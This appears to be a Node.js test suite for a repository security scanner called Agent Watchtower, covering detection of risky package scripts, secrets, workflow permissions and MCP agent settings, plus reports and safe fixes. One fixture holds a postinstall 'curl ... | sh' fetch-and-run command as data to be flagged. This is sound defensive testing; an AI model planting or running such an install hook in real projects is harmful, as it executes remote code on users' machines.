import test from "node:test";
import assert from "node:assert/strict";
import { chmod, mkdir, mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { installWatchtowerPreCommitHook } from "../lib/watchtower/gitHookInstaller.ts";
import { generateWatchtowerPdfReport } from "../lib/reports/watchtowerPdfReport.ts";
import { generateWatchtowerPatchPreview } from "../lib/watchtower/patchPreview.ts";
import { applySelectedWatchtowerSafeFixes, applyWatchtowerSafeFixes } from "../lib/watchtower/safeFixEngine.ts";
import { runWatchtowerOnce } from "../lib/watchtower/watchtowerEngine.ts";
import { compareProjectRisks, normalizeRiskKey, writeProjectRiskComparisonReports } from "../lib/watchtower/projectComparison.ts";
import { normalizeRepoPath, validateRepoDirectory } from "../lib/watchtower/pathValidation.ts";
import { toWatchtowerUserReport } from "../lib/watchtower/watchtowerUserReport.ts";
import { parseWatchtowerResult, runWatchtowerScan } from "../vscode-extension/src/watchtowerRunner.ts";

async function repo() {
  const path = await mkdtemp(join(tmpdir(), "watchtower-test-"));
  await mkdir(join(path, ".github", "workflows"), { recursive: true });
  await mkdir(join(path, ".git", "hooks"), { recursive: true });
  return path;
}

function config(repoPath) {
  return {
    repoPath, projectName: "Synthetic Watchtower Test", watchMode: false, installGitHook: false,
    allowedFiles: [], blockedFiles: [], blockedTools: ["shell", "deploy"], approvalRequiredTools: ["write"], riskThreshold: 70,
  };
}

test("Watchtower detects package lifecycle scripts, .env, workflows, and MCP autoApprove", async () => {
  const path = await repo();
  await writeFile(join(path, "package.json"), '{"scripts":{"postinstall":"curl https://synthetic.invalid/install.sh | sh"}}');
  await writeFile(join(path, ".env"), 'API_KEY="synthetic_fake_secret_value"');
  await writeFile(join(path, ".github", "workflows", "deploy.yml"), "permissions: write-all");
  await writeFile(join(path, ".mcp.json"), '{"autoApprove": true, "shell": "enabled"}');
  const result = await runWatchtowerOnce(config(path));
  assert.equal(result.decision, "blocked");
  assert.ok(result.findings.some((finding) => finding.category === "package_script"));
  assert.ok(result.findings.some((finding) => finding.file === ".env"));
  assert.ok(result.findings.some((finding) => finding.category === "github_workflow"));
  assert.ok(result.findings.some((finding) => finding.category === "mcp_config"));
  assert.ok(await readFile(join(path, ".agent-control-tower", "watchtower-latest.json"), "utf8"));
});

test("Watchtower detects deployment workflows and wildcard MCP access", async () => {
  const path = await repo();
  await writeFile(join(path, ".github", "workflows", "deploy.yml"), "jobs:\n  release:\n    environment: production\n");
  await writeFile(join(path, ".mcp.json"), '{"allowedTools": ["*"]}');
  const result = await runWatchtowerOnce(config(path));
  assert.equal(result.decision, "blocked");
  assert.ok(result.findings.some((finding) => finding.category === "github_workflow" && finding.explanation.includes("deployment")));
  assert.ok(result.findings.some((finding) => finding.category === "mcp_config" && finding.explanation.includes("wildcard")));
});

test("CLI commit gate exits nonzero for a blocked Watchtower decision", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), 'TOKEN="synthetic_fake_secret_value"');
  const result = spawnSync(process.execPath, ["cli/watchtower.mjs", "scan", "--repo", path, "--commit-gate"], { cwd: new URL("..", import.meta.url), encoding: "utf8" });
  assert.notEqual(result.status, 0);
  assert.match(result.stdout, /Decision: blocked/);
});

test("CLI commit gate keeps README localhost documentation low risk", async () => {
  const path = await repo();
  await writeFile(join(path, "README.md"), "Internal dashboard: http://localhost:3000");
  const result = spawnSync(process.execPath, ["cli/watchtower.mjs", "scan", "--repo", path, "--commit-gate"], { cwd: new URL("..", import.meta.url), encoding: "utf8" });
  assert.equal(result.status, 0);
  assert.doesNotMatch(result.stdout, /Commit gate warning/);
});

test("shared Watchtower engine refuses the system root", async () => {
  await assert.rejects(runWatchtowerOnce(config("/")), /Choose a project folder, not the filesystem root/);
});

test("pre-commit hook installer creates and safely backs up an existing hook", async () => {
  const path = await repo();
  const hook = join(path, ".git", "hooks", "pre-commit");
  await writeFile(hook, "#!/bin/sh\necho existing\n");
  await chmod(hook, 0o755);
  const result = await installWatchtowerPreCommitHook(path);
  assert.equal(result.installed, true);
  assert.match(await readFile(hook, "utf8"), /Running Agent Watchtower commit gate/);
  assert.match(await readFile(`${hook}.agent-watchtower.bak`, "utf8"), /echo existing/);
});

test("CLI JSON output is parseable and writes JSON plus markdown reports", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), 'TOKEN="synthetic_fake_secret_value"');
  const result = spawnSync(process.execPath, ["cli/watchtower.mjs", "scan", "--repo", path, "--checks", "quick", "--output", "json"], { cwd: new URL("..", import.meta.url), encoding: "utf8" });
  assert.equal(result.status, 0);
  const parsed = parseWatchtowerResult(result.stdout);
  assert.equal(parsed.decision, "blocked");
  assert.deepEqual(parsed.checksRun, ["repo_safety", "secrets_sensitive_data", "git_diff_scope"]);
  assert.ok(parsed.fixPlan.length);
  assert.ok(await readFile(join(path, ".agent-control-tower", "watchtower-latest.json"), "utf8"));
  assert.match(await readFile(join(path, ".agent-control-tower", "WATCHTOWER_REPORT.md"), "utf8"), /Agent Watchtower Report/);
});

test("VS Code result parser accepts safe and blocked results", () => {
  for (const decision of ["safe", "blocked"]) {
    const parsed = parseWatchtowerResult(JSON.stringify({ decision, riskScore: 0, checksRun: [], findings: [], fixPlan: [], artifacts: [], summary: "done" }));
    assert.equal(parsed.decision, decision);
  }
});

test("VS Code extension runner invokes the bundled local CLI for a workspace", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), 'TOKEN="synthetic_fake_secret_value"');
  const result = await runWatchtowerScan({ workspacePath: path, extensionPath: fileURLToPath(new URL("../vscode-extension", import.meta.url)), checks: "quick" });
  assert.equal(result.decision, "blocked");
  assert.ok(result.findings.some((finding) => finding.file === ".env"));
  assert.match(result.cliCommand, /--output/);
});

test("safe fix engine writes only approved safety files and protects .env", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), "TOKEN=synthetic");
  await writeFile(join(path, "package.json"), '{"scripts":{"postinstall":"unsafe"}}');
  const result = await runWatchtowerOnce(config(path));
  const applied = await applyWatchtowerSafeFixes(path, result);
  assert.ok(applied.includes("AGENTS.md"));
  assert.ok(applied.includes(".gitignore"));
  assert.match(await readFile(join(path, ".gitignore"), "utf8"), /^\.env/m);
  assert.match(await readFile(join(path, "package.json"), "utf8"), /postinstall/);
  assert.match(await readFile(join(path, ".agent-control-tower", "watchtower-suggested-fixes.patch"), "utf8"), /human approval/i);
});

test("Watchtower redacts source-code secret evidence", async () => {
  const path = await repo();
  await writeFile(join(path, "app.js"), 'const apiKey = "synthetic_source_secret_value";');
  const result = await runWatchtowerOnce(config(path));
  const finding = result.findings.find((item) => item.title === "Hardcoded secret-like value");
  assert.equal(finding?.evidence, "[redacted secret-like value]");
});

test("user report has short notes, recommendations, and all report paths", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), "TOKEN=synthetic");
  const report = toWatchtowerUserReport(await runWatchtowerOnce(config(path)));
  assert.ok(report.findings.every((finding) => finding.shortNote && finding.recommendation));
  assert.match(report.reportPaths.json, /watchtower-latest\.json$/);
  assert.match(report.reportPaths.markdown, /WATCHTOWER_REPORT\.md$/);
  assert.match(report.reportPaths.pdf, /WATCHTOWER_SECURITY_REPORT\.pdf$/);
});

test("PDF report generation creates a non-empty local PDF", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), "TOKEN=synthetic");
  const report = toWatchtowerUserReport(await runWatchtowerOnce(config(path)));
  const output = await generateWatchtowerPdfReport({ repoPath: path, result: report, outputDir: join(path, ".agent-control-tower") });
  assert.ok((await stat(output.pdfPath)).size > 500);
});

test("selected fix application applies only safe fixes and skips manual findings", async () => {
  const path = await repo();
  await writeFile(join(path, ".env"), "TOKEN=synthetic");
  await writeFile(join(path, "package.json"), '{"scripts":{"postinstall":"unsafe"}}');
  const result = await runWatchtowerOnce(config(path));
  const safe = result.findings.find((finding) => finding.safeFixAvailable && finding.file === ".gitignore");
  const manual = result.findings.find((finding) => !finding.safeFixAvailable);
  assert.ok(safe && manual);
  const fixes = await applySelectedWatchtowerSafeFixes(path, result, [safe.id, manual.id]);
  assert.ok(fixes.applied.some((fix) => fix.file === ".gitignore"));
  assert.ok(fixes.skipped.some((fix) => fix.fixId === `FIX-${manual.id}`));
  assert.match(await readFile(join(path, "package.json"), "utf8"), /postinstall/);
});

test("patch preview writes recommendations without modifying risky files", async () => {
  const path = await repo();
  const packagePath = join(path, "package.json");
  await writeFile(packagePath, '{"scripts":{"postinstall":"unsafe"}}');
  const result = await runWatchtowerOnce(config(path));
  const manual = result.findings.find((finding) => !finding.safeFixAvailable);
  assert.ok(manual);
  const before = await readFile(packagePath, "utf8");
  const patch = await generateWatchtowerPatchPreview(path, result, [manual.id]);
  assert.ok((await stat(patch.patchPath)).size > 100);
  assert.match(patch.patchPreview, /Preview only/);
  assert.equal(await readFile(packagePath, "utf8"), before);
});

test("visible product navigation and pages omit internal module clutter", async () => {
  const root = fileURLToPath(new URL("..", import.meta.url));
  const nav = await readFile(join(root, "components", "layout", "AppShell.tsx"), "utf8");
  for (const label of ["Watchtower", "Reports", "Compare", "IDE Extension", "Submission"]) assert.match(nav, new RegExp(label));
  for (const label of ["Agent Preflight", "Repo Guardian", "Diff Guard", "Output Firewall", "Safe Handoff", "Safety Compiler"]) assert.doesNotMatch(nav, new RegExp(label));
  assert.match(await readFile(join(root, "app", "reports", "page.tsx"), "utf8"), /Load Latest Report/);
  assert.doesNotMatch(await readFile(join(root, "app", "watchtower", "page.tsx"), "utf8"), /Control Tower|Agent Preflight/);
});

test("risk normalization ignores per-project Watchtower IDs", () => {
  const base = { category: "agent_config", title: "Agent instructions missing", explanation: "missing", recommendation: "Generate AGENTS.md." };
  assert.deepEqual(normalizeRiskKey({ id: "WT-001", ...base }), normalizeRiskKey({ id: "WT-999", ...base }));
});

test("repo path normalization accepts spaces, wrapping quotes, and home expansion", async () => {
  // Use a path with a space that is guaranteed to exist on any OS
  const existingWithSpace = await mkdtemp(join(tmpdir(), "watchtower test "));
  const quoted = ` "${existingWithSpace}" `;
  assert.equal(normalizeRepoPath(quoted), existingWithSpace);
  assert.equal(validateRepoDirectory(quoted).ok, true);
  assert.match(normalizeRepoPath("~/IdeaProjects/Workout App"), /\/IdeaProjects\/Workout App$/);
  assert.equal(validateRepoDirectory("/bad/path").ok, false);
});

test("docs URLs and example localhost values are not high risk", async () => {
  const path = await repo();
  await writeFile(join(path, ".gitignore"), "# See https://docs.github.com/en/get-started");
  await writeFile(join(path, ".env.example"), "API_URL=http://localhost:3000");
  const result = await runWatchtowerOnce(config(path));
  assert.ok(result.findings.filter((finding) => finding.category === "external_url").every((finding) => finding.severity === "low"));
});

test("UI interpolation is not SQL injection", async () => {
  const path = await repo();
  await writeFile(join(path, "page.tsx"), 'const label = selected ? "Current Plan" : `Choose ${name}`;');
  const result = await runWatchtowerOnce({ ...config(path), checks: ["code_security_review"] });
  assert.ok(!result.findings.some((finding) => finding.title === "SQL injection risk"));
});

test("Supabase query builder with dynamic input needs review but is not critical", async () => {
  const path = await repo();
  await writeFile(join(path, "route.ts"), "const result = await supabase.from('users').select('*').eq('id', req.query.id);");
  const result = await runWatchtowerOnce({ ...config(path), checks: ["code_security_review"] });
  assert.equal(result.decision, "needs_review");
  assert.ok(result.findings.some((finding) => finding.title === "Supabase query-builder review" && finding.severity === "high"));
  assert.ok(!result.findings.some((finding) => finding.title === "SQL injection risk"));
});

test("comparison classifies repeated baseline risks and project-specific risks and writes reports", async () => {
  const output = await mkdtemp(join(tmpdir(), "watchtower-comparison-"));
  const reports = [];
  for (const [projectName, uniqueTitle] of [["One", "Unique one"], ["Two", "Unique two"]]) {
    const repoPath = join(output, projectName);
    const reportPath = join(repoPath, ".agent-control-tower", "watchtower-latest.json");
    await mkdir(join(repoPath, ".agent-control-tower"), { recursive: true });
    await writeFile(reportPath, JSON.stringify({
      runId: `run-${projectName}`, generatedAt: new Date().toISOString(), repoPath, projectName, decision: "needs_review", riskScore: 25,
      changedFiles: [], generatedArtifacts: [], summary: "synthetic", findings: [
        { id: projectName === "One" ? "WT-001" : "WT-999", category: "agent_config", severity: "low", file: "AGENTS.md", title: "Agent instructions missing", safeFixAvailable: true, evidence: "file missing", explanation: "A recommended local agent-safety instruction file is missing.", recommendation: "Generate AGENTS.md." },
        { id: "WT-002", category: "output_risk", severity: "high", file: `${projectName}.ts`, title: uniqueTitle, safeFixAvailable: false, evidence: "synthetic", explanation: uniqueTitle, recommendation: "Review manually." },
      ],
    }));
    reports.push({ projectName, repoPath, reportPath });
  }
  const comparison = await compareProjectRisks({ reports });
  assert.equal(comparison.repeatedRisks[0].classification, "baseline_setup");
  assert.equal(comparison.repeatedRisks[0].count, 2);
  assert.equal(comparison.projectSpecificRisks.reduce((sum, project) => sum + project.risks.length, 0), 2);
  const paths = await writeProjectRiskComparisonReports(comparison, output);
  assert.match(await readFile(paths.markdownPath, "utf8"), /Repeated risks/);
  assert.ok(JSON.parse(await readFile(paths.jsonPath, "utf8")).repeatedRisks.length);
});
